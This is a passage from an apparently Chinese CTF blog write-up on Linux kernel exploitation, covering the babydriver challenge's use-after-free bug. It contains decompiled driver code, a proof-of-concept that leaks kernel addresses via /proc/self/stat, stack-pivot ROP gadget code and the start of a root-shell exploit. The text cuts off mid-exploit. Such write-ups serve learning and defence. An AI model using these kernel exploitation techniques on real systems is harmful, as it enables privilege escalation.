    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>





</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213154009-ngubrhc.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250213154009-ngubrhc.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="参考"><span class="me-2">参考</span><a href="#参考" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>https://blog.smallkirby.com/posts/flitbip/
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="ncstisc2018-babydriveruaf"><span class="me-2">ncstisc2018-babydriver(UAF)</span><a href="#ncstisc2018-babydriveruaf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="题目分析-1"><span class="me-2">题目分析</span><a href="#题目分析-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>init 文件， 加载了一个ko内核驱动模块</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
 
mount <span class="nt">-t</span> proc none /proc
mount <span class="nt">-t</span> sysfs none /sys
mount <span class="nt">-t</span> devtmpfs devtmpfs /dev
<span class="nb">echo</span> <span class="s2">"flag{this_is_a_sample_flag}"</span> <span class="o">&gt;</span> flag
<span class="nb">chown </span>root:root flag
<span class="nb">chmod </span>400 flag
<span class="nb">exec </span>0&lt;/dev/console
<span class="nb">exec </span>1&gt;/dev/console
<span class="nb">exec </span>2&gt;/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
<span class="nb">chmod </span>777 /dev/babydev
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Boot took </span><span class="si">$(</span><span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> /proc/uptime<span class="si">)</span><span class="s2"> seconds</span><span class="se">\n</span><span class="s2">"</span>
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff <span class="nt">-d</span> 0  <span class="nt">-f</span>

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>启动参数 SMEP 已启用、SMAP 已禁用、oops-&gt;panic、KASLR 已启用</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>qemu-system-x86_64 <span class="nt">-initrd</span> rootfs.cpio <span class="nt">-s</span> <span class="se">\</span>
    <span class="nt">-kernel</span> bzImage <span class="se">\</span>
    <span class="nt">-append</span> <span class="s1">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> <span class="se">\</span>
    <span class="nt">-enable-kvm</span> <span class="nt">-monitor</span> /dev/null <span class="nt">-m</span> 64M <span class="se">\</span>
    <span class="nt">--nographic</span>  <span class="nt">-smp</span> <span class="nv">cores</span><span class="o">=</span>1,threads<span class="o">=</span>1 <span class="nt">-cpu</span> kvm64,+smep
</pre></td></tr></tbody></table></code></div></div>

<ol>
  <li>
    <p>​<strong>​<code class="language-plaintext highlighter-rouge">qemu-system-x86_64</code>​</strong>​</p>

    <ul>
      <li>启动 QEMU 进行 x86_64 架构的虚拟化。<code class="language-plaintext highlighter-rouge">qemu-system-x86_64</code>​ 是 QEMU 提供的一个可执行文件，用于模拟 x86_64 架构的系统。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-initrd rootfs.cpio</code>​</strong>​</p>

    <ul>
      <li>指定初始 RAM 文件系统（initrd）的路径。这里使用了 <code class="language-plaintext highlighter-rouge">rootfs.cpio</code>​ 作为 <code class="language-plaintext highlighter-rouge">initrd</code>​。<code class="language-plaintext highlighter-rouge">initrd</code>​ 是一个临时的根文件系统，通常用于在启动过程中提供必需的工具和驱动程序。它通常会在内核启动时被加载。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-s</code>​</strong>​</p>

    <ul>
      <li>启用 GDB 调试服务器，并在默认的端口 <code class="language-plaintext highlighter-rouge">1234</code>​ 上监听连接。使用此参数后，你可以使用 GDB 连接到 QEMU 进行调试。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-kernel bzImage</code>​</strong>​</p>

    <ul>
      <li>指定内核映像的路径。这里使用了 <code class="language-plaintext highlighter-rouge">bzImage</code>​，它是编译过的 Linux 内核镜像文件。<code class="language-plaintext highlighter-rouge">bzImage</code>​ 是一种压缩过的内核镜像格式，通常用于启动 Linux 系统。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-append 'console=ttyS0 root=/dev/ram nokaslr oops=panic panic=1'</code>​</strong> ​</p>

    <ul>
      <li>
        <p>启动内核时传递给内核的参数。各个参数的作用如下：</p>

        <ul>
          <li>​<code class="language-plaintext highlighter-rouge">console=ttyS0</code>​：将内核的控制台输出重定向到 <code class="language-plaintext highlighter-rouge">ttyS0</code>​（即串行端口 0）。这允许通过串行终端看到内核启动日志和调试信息。</li>
          <li>​<code class="language-plaintext highlighter-rouge">root=/dev/ram</code>​：指定根文件系统的位置为 <code class="language-plaintext highlighter-rouge">/dev/ram</code>​，通常与内存文件系统一起使用，这意味着内核将从 RAM 中加载根文件系统，而不是从硬盘中读取。</li>
          <li>​<code class="language-plaintext highlighter-rouge">nokaslr</code>​：禁用地址空间布局随机化（ASLR）。ASLR 会随机化内核地址，这对于调试和一些类型的漏洞利用是不方便的，因此在调试时通常会禁用它。</li>
          <li>​<code class="language-plaintext highlighter-rouge">oops=panic</code>​：当内核发生 Oops 错误（一般指内核级的崩溃）时，触发 panic。默认行为是继续运行，但此设置将导致系统在遇到 Oops 错误时立即崩溃。</li>
          <li>​<code class="language-plaintext highlighter-rouge">panic=1</code>​：内核在 panic 时会立即重启。这里设置为 1，意味着内核发生 panic 后立即重启。</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-enable-kvm</code>​</strong>​</p>

    <ul>
      <li>启用 KVM（Kernel-based Virtual Machine）。这使得 QEMU 使用硬件加速（如果硬件支持）来提高虚拟化性能。启用 KVM 可以显著提高模拟器的性能，尤其是在支持硬件虚拟化的处理器上。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-monitor /dev/null</code>​</strong>​</p>

    <ul>
      <li>禁用 QEMU 的监控控制台。通常情况下，QEMU 提供一个监控界面，允许你通过命令控制虚拟机的行为。使用 <code class="language-plaintext highlighter-rouge">/dev/null</code>​ 作为目标会使得该接口不输出任何内容，从而禁用监控。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-m 64M</code>​</strong>​</p>

    <ul>
      <li>指定虚拟机的内存大小为 64MB。你可以根据需要调整内存的大小，尤其是在资源受限的环境中运行 QEMU 时，减少内存消耗可能是有意义的。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">--nographic</code>​</strong>​</p>

    <ul>
      <li>禁用 QEMU 的图形输出，改为使用控制台输出。通常，在没有图形用户界面的环境中使用 <code class="language-plaintext highlighter-rouge">--nographic</code>​ 来使得 QEMU 在终端模式下运行，这样可以通过串行终端或标准输出查看虚拟机的输出。</li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-smp cores=1,threads=1</code>​</strong>​</p>

    <ul>
      <li>
        <p>设置虚拟机的 CPU 配置：</p>

        <ul>
          <li>​<code class="language-plaintext highlighter-rouge">cores=1</code>​：虚拟机有一个 CPU 核心。</li>
          <li>​<code class="language-plaintext highlighter-rouge">threads=1</code>​：每个核心只有一个线程。这意味着虚拟机只有一个 CPU 核心，没有启用超线程。</li>
        </ul>
      </li>
      <li>
        <p>你可以根据需要修改为更多的核心和线程。</p>
      </li>
    </ul>
  </li>
  <li>
    <p>​ <strong>​<code class="language-plaintext highlighter-rouge">-cpu kvm64,+smep</code>​</strong>​</p>

    <ul>
      <li>
        <p>设置虚拟机的 CPU 类型和特性：</p>

        <ul>
          <li>​<code class="language-plaintext highlighter-rouge">kvm64</code>​：指定虚拟机使用的 CPU 模型为 <code class="language-plaintext highlighter-rouge">kvm64</code>​，这是 QEMU 中为 KVM 虚拟化提供的默认 CPU 模型。</li>
          <li>​<code class="language-plaintext highlighter-rouge">+smep</code>​：启用 SMEP（Supervisor Mode Execution Prevention）。SMEP 是一种硬件级别的安全机制，防止在内核模式下执行用户空间的代码。启用 SMEP 提高了虚拟机的安全性。</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>ko模块分析, 四个功能 <code class="language-plaintext highlighter-rouge">open</code>​ <code class="language-plaintext highlighter-rouge">ioctl</code>​ <code class="language-plaintext highlighter-rouge">write</code>​ <code class="language-plaintext highlighter-rouge">read</code>​, 还有一个 <code class="language-plaintext highlighter-rouge">babyrelease</code>​</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre></td><td class="rouge-code"><pre><span class="n">__int64</span> <span class="nf">babyopen</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">babydev_struct</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">kmem_cache_alloc_trace</span><span class="p">(</span><span class="n">kmalloc_caches</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="mh">0x24000C0LL</span><span class="p">,</span> <span class="mi">64LL</span><span class="p">);</span>
  <span class="n">G_size</span> <span class="o">=</span> <span class="mi">64LL</span><span class="p">;</span>
  <span class="n">printk</span><span class="p">(</span><span class="s">"device open</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">babyrelease</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">kfree</span><span class="p">(</span><span class="n">babydev_struct</span><span class="p">);</span>
  <span class="n">printk</span><span class="p">(</span><span class="s">"device release</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">__int64</span> <span class="nf">babyioctl</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">cmd</span> <span class="o">==</span> <span class="mh">0x10001</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">kfree</span><span class="p">(</span><span class="n">babydev_struct</span><span class="p">);</span>
    <span class="n">babydev_struct</span> <span class="o">=</span> <span class="n">_kmalloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mi">37748928LL</span><span class="p">);</span>
    <span class="n">G_size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">printk</span><span class="p">(</span><span class="s">"alloc done</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_2EB</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">22LL</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">ssize_t</span> <span class="nf">babywrite</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">user_buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>

  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">babydev_struct</span> <span class="p">)</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
  <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2LL</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">G_size</span> <span class="o">&gt;</span> <span class="n">length</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">copy_from_user</span><span class="p">(</span><span class="n">babydev_struct</span><span class="p">,</span> <span class="n">user_buffer</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">length</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">ssize_t</span> <span class="nf">babyread</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">user_buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>

  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">babydev_struct</span> <span class="p">)</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
  <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2LL</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">G_size</span> <span class="o">&gt;</span> <span class="n">length</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">copy_to_user</span><span class="p">(</span><span class="n">user_buffer</span><span class="p">,</span> <span class="n">babydev_struct</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">length</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>从上面的代码可以分析出一个UAF 漏洞, 可以同时打开两次，close fd1 一个后 会 free 堆块，没有清空指针，然后还剩一个fd2 可以继续对堆块进行操作</p>

<p>‍</p>

<h3 id="出了点小问题"><span class="me-2">出了点小问题</span><a href="#出了点小问题" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>无论是 有 还是没有 <code class="language-plaintext highlighter-rouge">nokaslr</code>​ kernel地址都没有变化，</p>

<ul>
  <li>感觉环境有点问题，所以说我用 linux 6.11 重新编译了一个ko</li>
</ul>

<p>‍</p>

<h3 id="stat文件-泄露地址原理"><span class="me-2">stat文件 泄露地址原理</span><a href="#stat文件-泄露地址原理" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>

    <span class="n">bind_core</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">ptr1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">odp</span><span class="p">(</span><span class="n">vuln_ko</span><span class="p">);</span>
    <span class="n">fd1</span> <span class="o">=</span> <span class="n">odp</span><span class="p">(</span><span class="n">vuln_ko</span><span class="p">);</span>

    <span class="n">lss</span><span class="p">(</span><span class="s">"fd = "</span><span class="p">,(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">fd</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="mh">0x10001</span> <span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20</span><span class="p">);</span> <span class="c1">// kmalloc 0x20 UAF, </span>

    <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">statfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/stat"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span> <span class="c1">// 也会申请 0x20</span>
    <span class="n">show</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">hexdump</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214130130-rzvls6l.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214130130-rzvls6l.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>调用链</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>entry_SYSCALL_64
do_syscall_64
x64_sys_call
__x64_sys_open
do_sys_openat2
do_filp_open
path_openat 
vfs_open 
do_dentry_open+508
__x86_indirect_thunk_array+416
proc_single_open
single_open
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134100-zgxu314.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134100-zgxu314.png" alt="image" loading="lazy"></a>​</p>

<p>然后也是申请到 了</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134117-qf84dz2.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134117-qf84dz2.png" alt="image" loading="lazy"></a>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134209-0kjiakr.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134209-0kjiakr.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134314-y6jdjz6.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214134314-y6jdjz6.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="uaf-stat-hijack"><span class="me-2">UAF stat hijack</span><a href="#uaf-stat-hijack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214140431-1ty3g8g.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214140431-1ty3g8g.png" alt="image" loading="lazy"></a>​</p>

<p>修改 这个 <code class="language-plaintext highlighter-rouge">single_start</code>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214143627-ipsklfo.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214143627-ipsklfo.png" alt="image" loading="lazy"></a>​</p>

<p>调用链</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="n">read</span><span class="p">(</span><span class="n">statfd</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">nbuf</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">);</span>
<span class="n">entry_SYSCALL_64</span>
<span class="n">do_syscall_64</span>
<span class="n">x64_sys_call</span>
<span class="n">__x64_sys_read</span>
<span class="n">ksys_read</span>
<span class="n">vfs_read</span>
<span class="n">__x86_indirect_thunk_array</span>
		<span class="err">►</span> <span class="mh">0xffffffff81f8f626</span> <span class="o">&lt;</span><span class="n">__x86_indirect_thunk_array</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span><span class="p">],</span> <span class="n">rax</span>        <span class="p">[</span><span class="mh">0xffffc900001cfe60</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mh">0xffffffff812d3f80</span> <span class="p">(</span><span class="n">seq_read</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">endbr64</span> 
   		<span class="mh">0xffffffff81f8f62a</span> <span class="o">&lt;</span><span class="n">__x86_indirect_thunk_array</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>    <span class="n">ret</span>
<span class="n">seq_read</span>
<span class="n">seq_read_iter</span>
<span class="n">seq_read_iter</span><span class="o">+</span><span class="mi">226</span>
<span class="n">__x86_indirect_thunk_array</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214144349-wnnx8qs.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214144349-wnnx8qs.png" alt="image" loading="lazy"></a>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214144237-0cmwdh3.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214144237-0cmwdh3.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214144416-2j4nx1j.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214144416-2j4nx1j.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="gadget-rop"><span class="me-2">gadget-ROP</span><a href="#gadget-rop" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>由于这题只开启了 SMEP 并没有开启 SMAP,所以说 可以找个控制 rsp 的</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">cat </span>gadget.txt|grep <span class="s2">": mov esp, 0x"</span>|grep <span class="s2">"ret;"</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="c1">// 0xffffffff81482605: mov esp, 0xebc58948; ret;</span>
<span class="kt">size_t</span> <span class="n">gadstack</span> <span class="o">=</span> <span class="mh">0xebc58948</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="o">*</span><span class="n">nbuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="n">gadstack</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xFFF</span><span class="p">,</span> <span class="mi">4</span><span class="o">*</span><span class="n">PAGE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_FIXED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>然后就可是ROP了</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214152829-48hgiux.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250214152829-48hgiux.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="exploit1"><span class="me-2">exploit1</span><a href="#exploit1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
#define stbase(value) ((value) - 0xffffffff81000000ULL)
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
